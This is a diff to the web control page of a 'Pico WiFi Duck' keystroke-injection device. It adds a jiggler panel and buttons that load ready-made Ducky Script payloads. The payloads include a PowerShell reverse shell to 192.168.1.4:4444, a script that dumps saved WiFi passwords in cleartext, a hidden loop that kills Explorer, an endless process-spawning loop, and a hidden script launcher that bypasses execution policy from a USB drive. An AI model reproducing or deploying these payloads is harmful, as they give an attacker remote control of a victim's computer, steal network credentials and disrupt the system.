@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pico  WIFI-Duck TR</title>
+    <title>Pico WIFI-Duck</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,36 +11,45 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            gap: 20px;
+            max-width: 1000px;
         }
 
         .form {
-        background-color:#2f3136;
-        height: 400px;
-        width: 400px;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-}
+            background-color: #2f3136;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            flex: 1;
+        }
+
+        .jiggler-panel {
+            background-color: #2f3136;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 250px;
+        }
 
         textarea {
-                    color: #bfbfbf;
+            color: #bfbfbf;
             resize: vertical;
             width: 100%;
-            height: 400px;
+            height: 300px;
             padding: 15px;
             border: none;
             border-radius: 4px;
             background: #36393e;
             font-family: "Courier New", Courier, monospace;
             box-sizing: border-box;
-            -moz-box-sizing: border-box;
-            -webkit-box-sizing: border-box;
         }
 
         button {
@@ -52,78 +61,228 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
+            width: 100%;
         }
 
         button:hover {
             background-color: #9f7e1c;
         }
-        h1 {
-	font-size: 1.4rem;
-	margin-top: 1rem;
-	background:
-	#bfbfbf;
-	padding: 10px;
-	border-radius: 4px;
-	border-left: solid #20c20e 5px;
-	font-weight: 100;
-	letter-spacing: 5px;
-}
-  footer {
-            background-color: #2f3136;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
+
+        .jiggler-btn {
+            background-color: #2196F3;
+            margin: 5px 0;
         }
-.title {
+
+        .jiggler-btn:hover {
+            background-color: #1976D2;
+        }
+
+        .jiggler-btn.stop {
+            background-color: #f44336;
+        }
+
+        .jiggler-btn.stop:hover {
+            background-color: #d32f2f;
+        }
+
+        h1 {
+            font-size: 1.4rem;
+            margin-top: 1rem;
+            background: #bfbfbf;
+            padding: 10px;
+            border-radius: 4px;
+            border-left: solid #20c20e 5px;
+            font-weight: 100;
+            letter-spacing: 5px;
+        }
+
+        h2 {
+            color: #fff;
+            margin-top: 0;
+            font-size: 1.2rem;
+        }
+
+        .title {
             font-size: 1.5rem;
             margin-bottom: 1rem;
-            color: balck;
-            position: absolute;
-            top: 60px;
-            left: 50%;
-            transform: translateX(-50%);
+            color: black;
+        }
+
+        .script-buttons {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+        }
+
+        .script-buttons button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 8px 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            flex: 1;
+            min-width: 80px;
+        }
+
+        .script-buttons button:hover {
+            background-color: #45a049;
+        }
+
+        .status {
+            color: #fff;
+            margin: 10px 0;
+            padding: 10px;
+            background: #36393e;
+            border-radius: 4px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="form">
+            <div class="title"><h1>Pico WiFi Duck</h1></div>
+            <h1>Editor</h1>
+            <div class="script-buttons">
+                <button onclick="loadTheFBombScript()">F-Bomb</button>
+                <button onclick="loadExplorerCrashScript()">Explorer</button>
+                <button onclick="loadWifiStealScript()">WiFi Steal</button>
+                <button onclick="loadReverseShellScript()">Reverse Shell</button>
+                <button onclick="loadUsbsteal()">USB Steal</button>
+            </div>
+            <textarea id="payload" name="content" placeholder="Ducky Script yazın..."></textarea>
+            <button onclick="runPayload()">RUN</button>
+        </div>
+
+        <div class="jiggler-panel">
+            <h2>🎮 Jiggler Kontrol</h2>
+            <button class="jiggler-btn" onclick="showJigglerOptions()">Mouse / Klavye</button>
+            
+            <div id="jigglerOptions" style="display: none;">
+                <button class="jiggler-btn" onclick="startMouseJiggle()">🖱️ Sadece Mouse</button>
+                <button class="jiggler-btn" onclick="startCombinedJiggle()">🖱️⌨️ Mouse + Klavye</button>
+                <button class="jiggler-btn stop" onclick="stopJiggler()">⏹️ DURDUR</button>
+            </div>
+            
+            <div class="status" id="status">
+                Hazır<br>
+                <small>GP5→GND: Mouse<br>GP6→GND: Mouse+Klavye</small>
+            </div>
+        </div>
+    </div>
+
     <script>
-        function sendHttpRequest(data) {
-       console.log(data);
-        var url = "http://192.168.4.1/api" ;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", url, true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-      
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === XMLHttpRequest.DONE) {
-            if (xhr.status === 200) {
-              // Request was successful
-              console.log("Request sent successfully!");
+        function sendRequest(url, data = null) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", url, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log("Request sent successfully!");
+                        document.getElementById("status").innerHTML = "✅ İşlem başarılı!";
+                    } else {
+                        console.error("Request failed. Status:", xhr.status);
+                        document.getElementById("status").innerHTML = "❌ Hata oluştu!";
+                    }
+                }
+            };
+            
+            if (data) {
+                xhr.send(JSON.stringify(data));
             } else {
-              // Request failed
-              console.error("Request failed. Status:", xhr.status);
+                xhr.send();
             }
-          }
-        };
-      
-        xhr.send(JSON.stringify(data));
-      };
-      function main(){
-        var payload = document.getElementById("payload").value ;
-        var data = {username : "Payload" , content : payload} ;
-        sendHttpRequest(data) ;
-      }
+        }
+
+        function runPayload() {
+            var payload = document.getElementById("payload").value;
+            var data = { username: "Payload", content: payload };
+            sendRequest("/api", data);
+            document.getElementById("status").innerHTML = "🚀 Payload çalıştırılıyor...";
+        }
+
+        function showJigglerOptions() {
+            var options = document.getElementById("jigglerOptions");
+            if (options.style.display === "none") {
+                options.style.display = "block";
+            } else {
+                options.style.display = "none";
+            }
+        }
+
+        function startMouseJiggle() {
+            sendRequest("/jiggle/mouse");
+            document.getElementById("status").innerHTML = "🖱️ Mouse jiggle başladı (5 saniye)...";
+        }
+
+        function startCombinedJiggle() {
+            sendRequest("/jiggle/combined");
+            document.getElementById("status").innerHTML = "🖱️⌨️ Mouse + Klavye başladı (5 saniye)...";
+        }
+
+        function stopJiggler() {
+            sendRequest("/jiggle/stop");
+            document.getElementById("status").innerHTML = "⏹️ Jiggler durduruldu";
+        }
+
+        // Mevcut script fonksiyonları
+        function loadTheFBombScript() {
+            document.getElementById("payload").value = `REM Title: the_f_bomb
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell while(1){ii **}
+ENTER`;
+        }
+
+        function loadExplorerCrashScript() {
+            document.getElementById("payload").value = `REM Kill-Explorer
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Command "while($true){Stop-Process -Name explorer -Force}"
+ENTER`;
+        }
+
+        function loadWifiStealScript() {
+            document.getElementById("payload").value = `DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+STRING cd %userprofile%\\Desktop
+ENTER
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wifi.txt
+ENTER`;
+        }
+
+        function loadReverseShellScript() {
+            document.getElementById("payload").value = `REM Reverse Shell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+STRING $ip='192.168.1.4'; $port=4444; $c=New-Object System.Net.Sockets.TCPClient($ip,$port); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while($true){$i=$s.Read($b,0,$b.Length); if($i -eq 0){break}; $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $o=(Invoke-Expression $d 2>&1 | Out-String); $o2=$o+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($o2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()
+ENTER`;
+        }
+
+        function loadUsbsteal() {
+            document.getElementById("payload").value = `DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+STRING $d=Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE DriveType=2 AND Label='Kali Linax'"
+ENTER
+STRING if ($d) { $p=$d.DriveLetter+'\\script.ps1'; if (Test-Path $p) { powershell -W Hidden -NoP -Exec Bypass -File "$p" } }
+ENTER`;
+        }
     </script>
-<div class="title"><h1>Pico WiFi Duck BUT Turkish</h1></div>
-    <div class="form">
-        <h1>Editor <a class="reload" id="editorReload"></a></h1>
-        <textarea id="payload" name="content" placeholder="Enter text here..."></textarea>
-        <button onclick="main()">RUN</button></div>
-  <footer style="background-color: #2f3136; color: white; text-align: center; padding: 10px;">
-        &copy; <span id="currentYear"></span> Majd Sassi | <a href="https://github.com/majdsassi/pico-wifi-duck">Github</a>
-    </footer>
 </body>
 </html>
